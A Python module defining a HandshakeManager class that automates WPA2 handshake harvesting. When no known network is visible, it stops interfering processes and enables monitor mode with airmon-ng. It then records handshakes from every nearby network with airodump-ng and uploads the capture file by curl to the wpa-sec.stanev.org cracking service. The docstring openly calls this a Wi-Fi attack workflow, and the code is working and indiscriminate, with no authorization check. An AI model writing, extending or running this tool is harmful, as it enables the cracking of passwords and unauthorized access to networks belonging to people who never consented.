import os
import subprocess
import time
import json
import re
from pathlib import Path
from utils.logger import Logger


class HandshakeManager:
    """
    Manages WPA2 handshake capture, upload to wpa-sec, and fallback logic.
    
    This class handles the passive Wi-Fi attack workflow:
    1. Scans for visible networks
    2. Checks if any known SSIDs are available
    3. If no known SSIDs found, enables monitor mode and captures handshakes
    4. Uploads captured handshakes to wpa-sec.stanev.org
    5. Provides fallback logic to retry known networks
    """
    
    def __init__(self, interface="wlan0", logger=None, capture_duration=300):
        """
        Initialize the HandshakeManager.
        
        Parameters:
            interface (str): WiFi interface name (default: wlan0)
            logger (Logger): Logger instance for recording activities
            capture_duration (int): Duration in seconds to capture handshakes (default: 300)
        """
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.capture_duration = capture_duration
        self.logger = logger or Logger(log_file="logs/handshake.log")
        self.capture_dir = Path("captures")
        self.capture_dir.mkdir(exist_ok=True)
        
    def load_wifi_credentials(self):
        """
        Load Wi-Fi credentials from configuration file.
        
        Returns:
            list: List of dictionaries containing SSID and Password
        """
        credentials_file = Path("config/wifi_credentials.json")
        try:
            with open(credentials_file, "r") as file:
                credentials = json.load(file)
                self.logger.log(f"[INFO] Loaded {len(credentials)} Wi-Fi credentials")
                return credentials
        except FileNotFoundError:
            self.logger.log(f"[ERROR] Wi-Fi credentials file not found at {credentials_file}")
            return []
        except json.JSONDecodeError as e:
            self.logger.log(f"[ERROR] Error decoding Wi-Fi credentials JSON: {e}")
            return []
            
    def scan_visible_networks(self):
        """
        Scan for visible Wi-Fi networks using nmcli.
        
        Returns:
            list: List of visible SSID names
        """
        try:
            self.logger.log("[INFO] Scanning for visible Wi-Fi networks")
            result = subprocess.run(
                ["sudo", "nmcli", "dev", "wifi", "list"], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode != 0:
                self.logger.log(f"[ERROR] Failed to scan networks: {result.stderr}")
                return []
                
            # Parse SSID names from nmcli output
            visible_ssids = []
            lines = result.stdout.strip().split('\n')[1:]  # Skip header
            for line in lines:
                # Extract SSID (second column in nmcli output)
                parts = line.split()
                if len(parts) >= 2:
                    ssid = parts[1]
                    if ssid != '--' and ssid not in visible_ssids:
                        visible_ssids.append(ssid)
                        
            self.logger.log(f"[INFO] Found {len(visible_ssids)} visible networks")
            return visible_ssids
            
        except Exception as e:
            self.logger.log(f"[ERROR] Exception during network scan: {e}")
            return []
            
    def check_known_networks_available(self, credentials, visible_ssids):
        """
        Check if any known networks are currently visible.
        
        Parameters:
            credentials (list): List of known Wi-Fi credentials
            visible_ssids (list): List of currently visible SSIDs
            
        Returns:
            list: List of available known networks (SSID, Password pairs)
        """
        available_networks = []
        known_ssids = [cred.get("SSID") for cred in credentials if cred.get("SSID")]
        
        for ssid in visible_ssids:
            for cred in credentials:
                if cred.get("SSID") == ssid:
                    available_networks.append(cred)
                    self.logger.log(f"[INFO] Known network available: {ssid}")
                    
        return available_networks
        
    def enable_monitor_mode(self):
        """
        Enable monitor mode on the wireless interface.
        
        Returns:
            bool: True if monitor mode enabled successfully, False otherwise
        """
        try:
            self.logger.log(f"[INFO] Enabling monitor mode on {self.interface}")
            
            # Kill processes that might interfere
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Enable monitor mode
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode == 0:
                self.logger.log(f"[SUCCESS] Monitor mode enabled on {self.monitor_interface}")
                return True
            else:
                self.logger.log(f"[ERROR] Failed to enable monitor mode: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.log(f"[ERROR] Exception enabling monitor mode: {e}")
            return False
            
    def disable_monitor_mode(self):
        """
        Disable monitor mode and return to managed mode.
        
        Returns:
            bool: True if monitor mode disabled successfully, False otherwise
        """
        try:
            self.logger.log(f"[INFO] Disabling monitor mode on {self.monitor_interface}")
            
            result = subprocess.run(
                ["sudo", "airmon-ng", "stop", self.monitor_interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode == 0:
                self.logger.log(f"[SUCCESS] Monitor mode disabled, returned to managed mode")
                # Restart network manager
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)  # Wait for network manager to restart
                return True
            else:
                self.logger.log(f"[ERROR] Failed to disable monitor mode: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.log(f"[ERROR] Exception disabling monitor mode: {e}")
            return False
            
    def capture_handshakes(self):
        """
        Capture WPA2 handshakes using airodump-ng.
        
        Returns:
            str: Path to the captured .cap file, or None if capture failed
        """
        try:
            timestamp = int(time.time())
            cap_file = self.capture_dir / f"handshakes_{timestamp}"
            
            self.logger.log(f"[INFO] Starting handshake capture for {self.capture_duration} seconds")
            
            # Run airodump-ng to capture packets
            cmd = [
                "sudo", "airodump-ng", 
                "-w", str(cap_file),
                "--output-format", "cap",
                self.monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Let it run for the specified duration
            time.sleep(self.capture_duration)
            
            # Terminate the process
            process.terminate()
            try:
                process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                
            # Check if cap file was created
            cap_file_path = f"{cap_file}-01.cap"
            if os.path.exists(cap_file_path):
                self.logger.log(f"[SUCCESS] Handshake capture completed: {cap_file_path}")
                return cap_file_path
            else:
                self.logger.log("[WARNING] No handshake file created")
                return None
                
        except Exception as e:
            self.logger.log(f"[ERROR] Exception during handshake capture: {e}")
            return None
            
    def check_internet_connectivity(self):
        """
        Check if internet connectivity is available.
        
        Returns:
            bool: True if internet is available, False otherwise
        """
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "8.8.8.8"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=10
            )
            
            if result.returncode == 0:
                self.logger.log("[INFO] Internet connectivity confirmed")
                return True
            else:
                self.logger.log("[INFO] No internet connectivity")
                return False
                
        except Exception as e:
            self.logger.log(f"[ERROR] Exception checking internet connectivity: {e}")
            return False
            
    def upload_to_wpa_sec(self, cap_file_path):
        """
        Upload captured handshake file to wpa-sec.stanev.org.
        
        Parameters:
            cap_file_path (str): Path to the .cap file to upload
            
        Returns:
            bool: True if upload successful, False otherwise
        """
        try:
            if not os.path.exists(cap_file_path):
                self.logger.log(f"[ERROR] Capture file not found: {cap_file_path}")
                return False
                
            self.logger.log(f"[INFO] Uploading {cap_file_path} to wpa-sec.stanev.org")
            
            # Upload using curl
            result = subprocess.run([
                "curl", "-X", "POST",
                "-F", f"file=@{cap_file_path}",
                "https://wpa-sec.stanev.org/",
                "-v"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=60)
            
            if result.returncode == 0:
                self.logger.log("[SUCCESS] Handshake file uploaded to wpa-sec successfully")
                return True
            else:
                self.logger.log(f"[ERROR] Upload failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.log("[ERROR] Upload timed out")
            return False
        except Exception as e:
            self.logger.log(f"[ERROR] Exception during upload: {e}")
            return False
            
    def run_handshake_workflow(self):
        """
        Execute the complete handshake capture workflow.
        
        Returns:
            dict: Workflow results containing success status and available networks
        """
        self.logger.log("[INFO] Starting handshake capture workflow")
        
        # Load known credentials
        credentials = self.load_wifi_credentials()
        if not credentials:
            self.logger.log("[ERROR] No Wi-Fi credentials available")
            return {"success": False, "available_networks": []}
            
        # Scan for visible networks
        visible_ssids = self.scan_visible_networks()
        if not visible_ssids:
            self.logger.log("[WARNING] No visible networks found")
            return {"success": False, "available_networks": []}
            
        # Check if any known networks are available
        available_networks = self.check_known_networks_available(credentials, visible_ssids)
        
        if available_networks:
            self.logger.log(f"[INFO] Found {len(available_networks)} known networks available")
            return {"success": True, "available_networks": available_networks}
            
        # No known networks available - proceed with handshake capture
        self.logger.log("[INFO] No known networks found, starting passive handshake capture")
        
        # Enable monitor mode
        if not self.enable_monitor_mode():
            self.logger.log("[ERROR] Failed to enable monitor mode")
            return {"success": False, "available_networks": []}
            
        try:
            # Capture handshakes
            cap_file = self.capture_handshakes()
            
            # Disable monitor mode
            self.disable_monitor_mode()
            
            if cap_file:
                # Check internet and upload if available
                if self.check_internet_connectivity():
                    self.upload_to_wpa_sec(cap_file)
                else:
                    self.logger.log("[INFO] No internet - will retry known networks")
                    
                # After capture, try known networks again
                time.sleep(5)  # Wait for interface to stabilize
                visible_ssids = self.scan_visible_networks()
                available_networks = self.check_known_networks_available(credentials, visible_ssids)
                
                return {"success": True, "available_networks": available_networks}
            else:
                self.logger.log("[WARNING] Handshake capture failed")
                return {"success": False, "available_networks": []}
                
        except Exception as e:
            self.logger.log(f"[ERROR] Exception in handshake workflow: {e}")
            # Ensure monitor mode is disabled
            self.disable_monitor_mode()
            return {"success": False, "available_networks": []}